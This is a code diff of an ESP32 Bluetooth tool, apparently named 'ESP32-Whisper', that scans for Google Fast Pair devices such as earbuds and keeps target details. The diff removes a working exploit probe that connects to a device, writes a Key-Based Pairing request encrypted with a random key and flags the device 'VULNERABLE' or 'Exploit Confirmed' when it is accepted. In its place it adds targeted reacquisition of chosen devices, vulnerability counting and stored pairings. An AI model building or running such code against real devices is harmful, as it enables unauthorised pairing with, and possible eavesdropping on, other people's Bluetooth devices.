@@ -5,56 +5,48 @@
 #include <NimBLEDevice.h>
 #include <vector>
 #include <algorithm> 
-#include "mbedtls/aes.h"
+#include <Preferences.h>
 
 #define MAX_SCANNED_DEVICES 50
 #define SCAN_STACK_SIZE 8192 
 
 struct ScannedDevice {
-    NimBLEAddress rawAddr; 
+    NimBLEAddress rawAddr; // Fixed: Use default constructor
     String address;
     uint8_t addrType;     
     String name;
-    bool isFastPair;      
-    bool isVulnerable;    
-    int rssi;
-    int lastLogRssi;       
-    uint32_t lastSeen;     
-    String modelId;        
+    bool isFastPair = false;      
+    bool isVulnerable = false; 
+    bool isPaired = false;   
+    int rssi = 0;
+    int lastLogRssi = 0;       
+    uint32_t lastSeen = 0;     
+    String modelId; 
+    
+    // Raw Service Data for upper-layer extraction (Model ID / Public Key)
+    std::vector<uint8_t> fpServiceData; 
 };
 
 class BleManager {
 private:
     NimBLEScan* pScan = nullptr;
-    NimBLEClient* pClient = nullptr;
     std::vector<ScannedDevice> discoveredDevices;
     SemaphoreHandle_t listLock;
     
     NimBLEUUID uuidFastPair; 
     NimBLEUUID uuidNearby;   
-    NimBLEUUID kbpUUID;      
+    
+    Preferences prefs;
     
     volatile bool _isScanning = false;
     volatile int vulnerableCount = 0;
-    
-    volatile bool notificationReceived = false;
 
-    // --- DEBUG CALLBACKS ---
-    class MyClientCallbacks : public NimBLEClientCallbacks {
-        void onConnect(NimBLEClient* pClient) override {
-            Serial.printf(">>> DEBUG: Callback -> Connected! Peer: %s\n", pClient->getPeerAddress().toString().c_str());
-        }
-
-        void onDisconnect(NimBLEClient* pClient, int reason) override {
-            Serial.printf(">>> DEBUG: Callback -> Disconnected! (Reason: %d) Peer: %s\n", reason, pClient->getPeerAddress().toString().c_str());
-        }
-        
-        bool onConnParamsUpdateRequest(NimBLEClient* pClient, const ble_gap_upd_params* params) override {
-            Serial.printf(">>> DEBUG: Params Update Request: Min=%d, Max=%d, Lat=%d, TO=%d\n", 
-                params->itvl_min, params->itvl_max, params->latency, params->supervision_timeout);
-            return true; // Auto-accept
-        }
-    };
+    String getStorageKey(String mac) {
+        String key = mac;
+        key.replace(":", ""); 
+        key.trim();
+        return key;
+    }
 
     static void scanTask(void* param) {
         BleManager* ble = (BleManager*)param;
@@ -90,11 +82,11 @@ private:
         }
 
         String parseModelId(const std::string& data) {
-            if (data.length() >= 4 && data[0] == 0x00) {
-                uint32_t modelId = ((uint8_t)data[1] << 16) | ((uint8_t)data[2] << 8) | (uint8_t)data[3];
-                char buf[7];
-                sprintf(buf, "%06X", modelId);
-                return String(buf);
+            if (data.length() >= 3) {
+                 uint32_t modelId = ((uint8_t)data[0] << 16) | ((uint8_t)data[1] << 8) | (uint8_t)data[2];
+                 char buf[7];
+                 sprintf(buf, "%06X", modelId);
+                 return String(buf);
             }
             return "";
         }
@@ -103,11 +95,14 @@ private:
             bool isFP = dev->isAdvertisingService(parent->uuidFastPair);
             bool isNearby = dev->isAdvertisingService(parent->uuidNearby);
             String fpModelId = "";
+            std::vector<uint8_t> rawFPData;
 
             if (dev->haveServiceData()) {
                 std::string fpData = dev->getServiceData(parent->uuidFastPair);
                 if (fpData.length() > 0) {
                     isFP = true;
+                    // Store Raw Data
+                    rawFPData.assign(fpData.begin(), fpData.end());
                     fpModelId = parseModelId(fpData);
                 }
                 if (dev->getServiceData(parent->uuidNearby).length() > 0) isNearby = true;
@@ -134,22 +129,16 @@ private:
                     bool found = false;
 
                     for(auto& d : parent->discoveredDevices) {
-                        // --- DEDUPLICATION LOGIC ---
-                        bool match = (d.rawAddr == currentAddr); // 1. Check exact MAC
+                        bool match = (d.rawAddr == currentAddr); 
                         
-                        // 2. Check Name Match (if names exist)
                         if (!match && !detectedName.isEmpty() && !d.name.isEmpty()) {
                             if (d.name == detectedName) match = true;
                         }
-
-                        // 3. Check Model ID Match (Best for Fast Pair rotation)
                         if (!match && !fpModelId.isEmpty() && !d.modelId.isEmpty()) {
                             if (d.modelId == fpModelId) match = true;
                         }
 
                         if(match) { 
-                            // FOUND! Update existing entry with LATEST details.
-                            // This ensures we always try to connect to the active MAC.
                             d.rawAddr = currentAddr; 
                             d.address = String(currentAddr.toString().c_str());
                             d.rssi = dev->getRSSI();
@@ -158,6 +147,8 @@ private:
                             
                             if (!fpModelId.isEmpty() && d.modelId.isEmpty()) d.modelId = fpModelId;
                             if (detectedName.length() > 0 && d.name != detectedName) d.name = detectedName;
+                            // Update Raw Data
+                            if (!rawFPData.empty()) d.fpServiceData = rawFPData;
                             
                             found = true;
                             break; 
@@ -176,10 +167,20 @@ private:
                         d.name = !detectedName.isEmpty() ? detectedName : fallbackName;
                         d.isFastPair = isFP;
                         d.isVulnerable = false;
+                        d.isPaired = false; // CRITICAL FIX: Explicit initialization
                         d.rssi = dev->getRSSI();
                         d.lastLogRssi = d.rssi;
                         d.lastSeen = millis();
                         d.modelId = fpModelId; 
+                        d.fpServiceData = rawFPData; // Save Data
+
+                        String key = parent->getStorageKey(d.address);
+                        if (parent->prefs.isKey(key.c_str())) { 
+                            if (parent->prefs.getBool(key.c_str(), false)) {
+                                d.isPaired = true;
+                                d.isVulnerable = false; 
+                            }
+                        }
                         
                         parent->discoveredDevices.push_back(d);
                     }
@@ -189,34 +190,17 @@ private:
         }
     };
 
-    void encryptPacketWithKey(uint8_t* input, uint8_t* output, uint8_t* key) {
-        mbedtls_aes_context aes;
-        mbedtls_aes_init(&aes);
-        mbedtls_aes_setkey_enc(&aes, key, 128);
-        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, input, output);
-        mbedtls_aes_free(&aes);
-    }
-
-    uint8_t parseHexNibble(char c) {
-        if (c >= '0' && c <= '9') return c - '0';
-        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
-        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
-        return 0;
-    }
-
 public:
     BleManager() {
         uuidFastPair = NimBLEUUID((uint16_t)0xFE2C);
         uuidNearby = NimBLEUUID((uint16_t)0xFEF3);
-        kbpUUID = NimBLEUUID("fe2c1234-8366-4814-8eb0-01de32100bea");
     }
 
     void init() {
         listLock = xSemaphoreCreateMutex();
+        prefs.begin("whisper", false);
         
         NimBLEDevice::init("ESP32-Whisper");
-        // Removed setPower to prevent potential brownouts/stability issues
-        // NimBLEDevice::setPower(ESP_PWR_LVL_P9); 
         
         pScan = NimBLEDevice::getScan();
         pScan->setScanCallbacks(new MyScanCallbacks(this), true); 
@@ -240,223 +224,91 @@ public:
         }
     }
 
-    bool isScanning() { return pScan->isScanning() || _isScanning; }
-    int getVulnCount() { return vulnerableCount; }
-    void lockList() { xSemaphoreTake(listLock, portMAX_DELAY); }
-    void unlockList() { xSemaphoreGive(listLock); }
-    std::vector<ScannedDevice>& getDevicesUnsafe() { return discoveredDevices; }
+    // TARGETED SEARCH FUNCTION
+    // actively searches for a specific ModelID or Name and UPDATES the passed device structure
+    bool reacquireTarget(ScannedDevice* devToUpdate, int timeoutSecs) {
+        if (devToUpdate == nullptr) return false;
 
-    bool testDevice(int index, String expectedName) {
-        Serial.println("\n--- START TEST ---");
+        String modelId = devToUpdate->modelId;
+        String name = devToUpdate->name;
         
-        // 1. HARD STOP SCAN (Keep existing logic here...)
-        bool wasScanning = isScanning();
-        if(wasScanning) stopScan();
+        Serial.printf(">>> Targeting: ID=%s / Name=%s\n", modelId.c_str(), name.c_str());
+        stopScan(); // Ensure clean slate
+        delay(100);
 
-        bool success = false;
-        // Start Retry Loop
-        for(int attempt = 0; attempt < 5; attempt++) { 
-            if(attempt > 0) {
-                startScan(); 
-                delay(5000); 
-                stopScan();
-                delay(1000); 
-            }
-            ScannedDevice dev;
-            bool found = false;
+        unsigned long startTime = millis();
+        pScan->clearResults(); 
+        
+        // Start scanning manually (we manage the loop here)
+        if(!pScan->start(0, false)) {
+            Serial.println(">> Reacquire: Scan failed to start");
+            return false;
+        }
 
-            // --- NEW SAFE LOOKUP LOGIC ---
-            lockList();
+        bool found = false;
+        
+        while(millis() - startTime < (timeoutSecs * 1000)) {
+            // Give the callback time to process
+            delay(50); 
             
-            // A. Try the index first (Fastest)
-            if(index >= 0 && index < discoveredDevices.size()) {
-                if (discoveredDevices[index].name == expectedName) {
-                    dev = discoveredDevices[index]; // Copy fresh data (including new MAC)
-                    found = true;
-                }
-            }
+            xSemaphoreTake(listLock, portMAX_DELAY);
+            for(const auto& d : discoveredDevices) {
+                // Check if this device was seen SINCE we started this specific scan
+                if(d.lastSeen > startTime) {
+                    bool match = false;
+                    
+                    // Prioritize Model ID match (Unique)
+                    if(!modelId.isEmpty() && !d.modelId.isEmpty()) {
+                        if(d.modelId == modelId) match = true;
+                    }
+                    // Fallback to Name
+                    else if(!name.isEmpty() && d.name == name) {
+                        match = true;
+                    }
 
-            // B. If index failed (list shifted), search by Name
-            if (!found) {
-                Serial.println("DEBUG: Index mismatch, searching by name...");
-                for (const auto& d : discoveredDevices) {
-                    if (d.name == expectedName) {
-                        dev = d;
+                    if(match) {
+                        // Directly update the object to preserve NimBLEAddress structure
+                        devToUpdate->rawAddr = d.rawAddr; // Copy valid NimBLEAddress
+                        devToUpdate->address = d.address;
+                        devToUpdate->addrType = d.addrType;
+                        devToUpdate->rssi = d.rssi;
+                        devToUpdate->lastSeen = d.lastSeen;
                         found = true;
                         break;
                     }
                 }
             }
-            unlockList();
-            // -----------------------------
+            xSemaphoreGive(listLock);
 
-            if (!found) {
-                Serial.println("Error: Device not found (List changed?)");
-                continue;
-            }
-
-            Serial.printf("DEBUG: Targeting Fresh MAC: %s\n", dev.rawAddr.toString().c_str());
-
-            // Cleanup previous client
-            if(pClient != nullptr) {
-                NimBLEDevice::deleteClient(pClient);
-                pClient = nullptr;
-            }
-
-            // USE RAW ADDRESS DIRECTLY (Preserves Type and exact MAC bytes)
-            NimBLEAddress targetAddr = dev.rawAddr;
-
-            pClient = NimBLEDevice::createClient();
-            if(!pClient) {
-                Serial.println("DEBUG: Failed to create client (Heap?)");
-                if(wasScanning) startScan();
-                return false;
-            }
-            pClient->setClientCallbacks(new MyClientCallbacks(), true);
-            pClient->setConnectTimeout(8); // 8 seconds
-
-            Serial.println("Connecting...");
-            bool connected = false;
-            int retryDelay = 1000;
-            
-            for(int i=0; i<3; i++) {
-                Serial.printf("DEBUG: Initiating connection to %s...\n", targetAddr.toString().c_str());
-                unsigned long startConn = millis();
-
-                // Attempt connect (false = do NOT delete attributes, faster retry)
-                bool attempt = pClient->connect(targetAddr, false);
-                
-                // Race condition check: Sometimes connect() returns false but IS connected
-                if (!attempt && pClient->isConnected()) {
-                    Serial.println("DEBUG: connect() returned false but isConnected() is true!");
-                    attempt = true;
-                }
-
-                if(attempt) { 
-                    Serial.printf("DEBUG: Connection Success (Time: %lu ms)\n", millis() - startConn);
-                    connected = true;
-                    break;
-                } else {
-                    Serial.printf("DEBUG: Connect Attempt %d Failed (Time: %lu ms). RSSI: %d\n", 
-                        i+1, millis() - startConn, pClient->getRssi());
-                    
-                    // Soft reset of client state
-                    pClient->disconnect(); 
-                    delay(retryDelay);
-                    retryDelay += 500; 
-                }
-            }
-
-            if(!connected) {
-                Serial.println("Connection Failed.");
-                if(pClient) {
-                    NimBLEDevice::deleteClient(pClient);
-                    pClient = nullptr;
-                }
-                if(wasScanning) startScan();
-                return false;
-            }
-
-            Serial.println("Connected! (Validating...)");
-            
-            // 5. MTU
-            if(pClient->exchangeMTU()) {
-                Serial.println("DEBUG: MTU Exchange Requested");
-            }
-            delay(300); 
-
-            bool success = false;
-            notificationReceived = false;
-
-            NimBLERemoteService* pSvc = pClient->getService(uuidFastPair);
-            if(pSvc) {
-                NimBLERemoteCharacteristic* pChar = pSvc->getCharacteristic(kbpUUID);
-                if(pChar) {
-                    Serial.println("Applying Quirk Delay (250ms)...");
-                    delay(250); 
-
-                    if(pChar->canNotify()) {
-                        pChar->subscribe(true, [this](NimBLERemoteCharacteristic* pChar, uint8_t* pData, size_t length, bool isNotify){
-                            this->notificationReceived = true;
-                            Serial.printf("DEBUG: Notification RX Len: %d\n", length);
-                        });
-                    }
-
-                    // 6. ENCRYPTION & WRITE
-                    uint8_t raw[16];
-                    raw[0] = 0x00; 
-                    raw[1] = 0x11; 
-                    
-                    String addrStr = dev.address;
-                    int byteIdx = 0;
-                    for (int i = 0; i < addrStr.length() && byteIdx < 6; i++) {
-                        char c = addrStr[i];
-                        if (c == ':') continue;
-                        uint8_t val = parseHexNibble(c) << 4;
-                        if (i + 1 < addrStr.length()) val |= parseHexNibble(addrStr[++i]);
-                        raw[2 + byteIdx] = val;
-                        byteIdx++;
-                    }
-                    
-                    uint8_t salt[8];
-                    for(int i=0; i<8; i++) {
-                        salt[i] = (uint8_t)random(0xFF);
-                        raw[8+i] = salt[i];
-                    }
-
-                    uint8_t key[16] = {0}; 
-                    memcpy(key, salt, 8); 
-
-                    uint8_t encrypted[16];
-                    encryptPacketWithKey(raw, encrypted, key);
-                    
-                    if(pChar->writeValue(encrypted, 16, true)) {
-                        Serial.println("Write Accepted -> VULNERABLE");
-                        success = true; 
-                    } else {
-                        Serial.println("Write Failed");
-                    }
-
-                    if (success) {
-                        unsigned long startWait = millis();
-                        while(millis() - startWait < 2000) { 
-                            if(notificationReceived) {
-                                Serial.println("Exploit Confirmed (Notification Received)!");
-                                break;
-                            }
-                            delay(10); 
-                        }
-                    }
-
-                    if (success) {
-                        lockList();
-                        for(auto& d : discoveredDevices) {
-                            if(d.rawAddr == dev.rawAddr) {
-                                d.isVulnerable = true;
-                                vulnerableCount++;
-                                break;
-                            }
-                        }
-                        unlockList();
-                    }
-                } else Serial.println("No KBP Char");
-            } else Serial.println("No FP Service");
-            
-            if (success) return true;
-            if (pClient && pClient->isConnected()) break; 
-            if (pClient) pClient->disconnect();
-        } 
-
-        Serial.println("Disconnecting...");
-        if(pClient) {
-            pClient->disconnect();
-            NimBLEDevice::deleteClient(pClient);
-            pClient = nullptr;
+            if(found) break;
         }
+
+        pScan->stop();
+        return found;
+    }
+
+    bool isScanning() { return pScan->isScanning() || _isScanning; }
+    int getVulnCount() { return vulnerableCount; }
+    void lockList() { xSemaphoreTake(listLock, portMAX_DELAY); }
+    void unlockList() { xSemaphoreGive(listLock); }
+    std::vector<ScannedDevice>& getDevicesUnsafe() { return discoveredDevices; }
+    
+    void incrementVuln() { vulnerableCount++; }
+
+    void clearPairings() {
+        lockList();
         
-        if(wasScanning) startScan(); 
-        Serial.println("--- TEST END ---\n");
-        return success;
+        prefs.clear(); // Wipes all keys in the 'whisper' namespace
+        // Force a close and reopen to ensure the flash commit happens immediately
+        prefs.end();
+        delay(10);
+        prefs.begin("whisper", false);
+
+        for(auto& d : discoveredDevices) {
+            d.isPaired = false;
+        }
+        unlockList();
+        Serial.println(">>> SYSTEM: All saved pairings have been cleared from flash.");
     }
 };
 
